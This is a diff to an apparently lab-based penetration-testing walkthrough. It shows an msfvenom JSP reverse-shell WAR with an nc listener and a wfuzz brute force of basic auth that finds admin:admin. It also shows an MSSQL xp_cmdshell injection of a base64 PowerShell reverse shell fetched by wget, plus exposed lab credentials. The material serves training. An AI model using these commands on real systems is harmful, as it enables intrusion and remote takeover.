@@ -91,7 +91,7 @@ Dirs found with a 401 response:
 {% endtab %}
 {% endtabs %}
 
-{% hint style="info" %}
+{% hint style="warning" %}
 Trying to access unsuccessfully for a couple of times will get you redirected to [**http://172.16.64.101:8080/manager/html**](http://172.16.64.101:8080/manager/html), where the following information is shown:
 
 ```text
@@ -103,15 +103,15 @@ Trying to access unsuccessfully for a couple of times will get you redirected to
 {% endhint %}
 
 {% tabs %}
-{% tab title="ncat listener" %}
-```bash
-nc -lvp 1234
-```
-{% endtab %}
-
 {% tab title="Generate your reverse shell with msfvenom" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=1234 -f war > shell.war
+```
+{% endtab %}
+
+{% tab title="ncat listener" %}
+```bash
+nc -lvp 1234
 ```
 {% endtab %}
 {% endtabs %}
@@ -134,7 +134,7 @@ You did it!
 | 80/tcp | open | http | Apache httpd 2.4.18 |
 
 {% tabs %}
-{% tab title="Dirbuster" %}
+{% tab title="OWASP Dirbuster 1.0-RC1" %}
 * Target URL: [http://172.16.64.140](http://172.16.64.140/project)
 * File Extension: \*
 * File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
@@ -142,17 +142,197 @@ You did it!
 
 {% tab title="Report" %}
 ```bash
+DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Wed Jul 21 18:08:17 EDT 2021
+--------------------------------
+
+http://172.16.64.140:80
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+/css/
+/img/
+
+Dirs found with a 401 response:
+
+/project/
+
+Dirs found with a 403 response:
+
+/icons/
+/project/includes/
+/icons/small/
+
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/css/style.css
+
+
+--------------------------------
 
 ```
 {% endtab %}
 {% endtabs %}
 
-![](../../.gitbook/assets/dirbuster-140-1.png)
+{% hint style="warning" %}
+**Found potential relevant information at** [**http://172.16.64.140/project**](http://172.16.64.140/project)**!**
 
-![](../../.gitbook/assets/dirbuster-140-2.png)
+However, such information is protected under basic authentication.
+{% endhint %}
+
+{% tabs %}
+{% tab title="wfuzz basic auth" %}
+```bash
+wfuzz -z file,/usr/share/seclists/Usernames/top-usernames-shortlist.txt -c --basic FUZZ:FUZZ http://172.16.64.140/project 
+```
+{% endtab %}
+
+{% tab title="Output" %}
+```bash
+$ 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://172.16.64.140/project
+Total requests: 17
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                     
+=====================================================================
+
+000000001:   401        14 L     54 W       460 Ch      "root - root"                                                                               
+000000003:   401        14 L     54 W       460 Ch      "test - test"                                                                               
+000000007:   401        14 L     54 W       460 Ch      "mysql - mysql"                                                                             
+000000015:   401        14 L     54 W       460 Ch      "ec2-user - ec2-user"                                                                       
+000000014:   401        14 L     54 W       460 Ch      "ansible - ansible"                                                                         
+000000017:   401        14 L     54 W       460 Ch      "azureuser - azureuser"                                                                     
+000000016:   401        14 L     54 W       460 Ch      "vagrant - vagrant"                                                                         
+000000006:   401        14 L     54 W       460 Ch      "adm - adm"                                                                                 
+000000012:   401        14 L     54 W       460 Ch      "pi - pi"                                                                                   
+000000013:   401        14 L     54 W       460 Ch      "puppet - puppet"                                                                           
+000000011:   401        14 L     54 W       460 Ch      "ftp - ftp"                                                                                 
+000000010:   401        14 L     54 W       460 Ch      "oracle - oracle"                                                                           
+000000008:   401        14 L     54 W       460 Ch      "user - user"                                                                               
+000000009:   401        14 L     54 W       460 Ch      "administrator - administrator"                                                             
+000000002:   301        9 L      28 W       316 Ch      "admin - admin"                                                                             
+000000004:   401        14 L     54 W       460 Ch      "guest - guest"                                                                             
+000000005:   401        14 L     54 W       460 Ch      "info - info"                                                                               
+
+Total time: 0.566855
+Processed Requests: 17
+Filtered Requests: 0
+Requests/sec.: 29.99000
+
+```
+{% endtab %}
+{% endtabs %}
+
+{% hint style="warning" %}
+**Discovered credentials to access** [**http://172.16.64.140/project**](http://172.16.64.140/project) **through \`wfuzz\`!**
+
+*  ****[**http://172.16.64.140/project**](http://172.16.64.140/project) ****is accessible through basic authentication with `admin:admin` credentials, as `301` status code is a redirection.
+
+Let's run `dirbuster`again against the new scope.
+{% endhint %}
+
+{% tabs %}
+{% tab title="OWASP Dirbuster 1.0-RC1" %}
+* Target URL: [http://172.16.64.140/project](http://172.16.64.140/project)
+* Use HTTP Authentication
+  * Username: admin
+  * Password: admin
+* File Extension: \*
+* File with list of dirs/files: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+{% endtab %}
+
+{% tab title="Report" %}
+```bash
+DirBuster 1.0-RC1 - Report
+http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+Report produced on Wed Jul 21 18:34:13 EDT 2021
+--------------------------------
+
+http://172.16.64.140:80
+--------------------------------
+Directories found during testing:
+
+Dirs found with a 200 response:
+
+/
+/img/
+/css/
+/project/
+/project/images/
+/project/css/
+/project/backup/
+/project/backup/images/
+/project/backup/css/
+/project/backup/test/
+/project/backup/backup/
+
+Dirs found with a 403 response:
+
+/icons/
+/icons/small/
+/project/includes/
+
+
+--------------------------------
+Files found during testing:
+
+Files found with a 200 responce:
+
+/css/style.css
+/project/index.html
+/project/about.html
+/project/services.html
+/project/solutions.html
+/project/blog.html
+/project/support.html
+/project/contact.html
+/project/css/ie.css
+/project/css/style.css
+/project/backup/index.html
+/project/backup/about.html
+/project/backup/services.html
+/project/backup/solutions.html
+/project/backup/support.html
+/project/backup/blog.html
+/project/backup/contact.html
+/project/backup/css/ie.css
+/project/backup/css/style.css
+/project/backup/test/asdasd.txt
+/project/backup/test/dsadasda.txt
+/project/backup/test/sdadas.txt
+/project/backup/test/test1.txt
+/project/backup/test/todo.txt
+/project/backup/backup/index.html
+/project/backup/backup/about.html
+/project/backup/backup/services.html
+/project/backup/backup/solutions.html
+/project/backup/backup/support.html
+/project/backup/backup/blog.html
+/project/backup/backup/contact.html
+
+
+--------------------------------
+
+```
+{% endtab %}
+{% endtabs %}
 
 {% hint style="info" %}
-**Discovering info**
+**Found relevant info!**
 
 On this url we find the following connection parameters for a SQL database server: [**http://172.16.64.140:80/project/backup/test/sdadas.txt**](http://172.16.64.140:80/project/backup/test/sdadas.txt):
 
@@ -215,8 +395,8 @@ Congratulations, you got it!
 | 49670/tcp | open | msrpc | Microsoft Windows RPC |
 | 49943/tcp | open | ms-sql-s | Microsoft SQL Server 2014 12.00.2000 |
 
-#### Attacking MS SQL Server
-
+{% tabs %}
+{% tab title="Preparing Reverse Shell for MS SQL Server" %}
 ```bash
 # Grab payload
 wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1;
@@ -230,12 +410,22 @@ cat mini-reverse.ps1 | iconv -f ascii -t utf16 | tail -c +3 | base64 -w 0 > enco
 # We'll use this payload in our shell
 cat encoded_payload 
 ```
+{% endtab %}
 
+{% tab title="Output Revshell" %}
+```
+
+```
+{% endtab %}
+
+{% tab title="netcat listener" %}
 ```bash
 # Leave nc opened in one terminal
 nc -l 1234
 ```
+{% endtab %}
 
+{% tab title="Connect to database/inject revshell" %}
 ```bash
 # Connect to database server and inject reverse shell via powershell
 mssql-cli -S 172.16.64.199 -U fooadmin -P fooadmin
@@ -244,6 +434,8 @@ mssql-cli -S 172.16.64.199 -U fooadmin -P fooadmin
 > xp_cmdshell whoami
 > xp_cmdshell powershell -e <payload_from_previous_step>
 ```
+{% endtab %}
+{% endtabs %}
 
 {% hint style="success" %}
 **Flag encountered!**
@@ -257,7 +449,7 @@ Congratulations! You exploited this machine!
 ```
 {% endhint %}
 
-{% hint style="info" %}
+{% hint style="warning" %}
 `ssh://developer:dF3334slKw@172.16.64.182:22` **seems like a ssh connection string:**
 
 ```
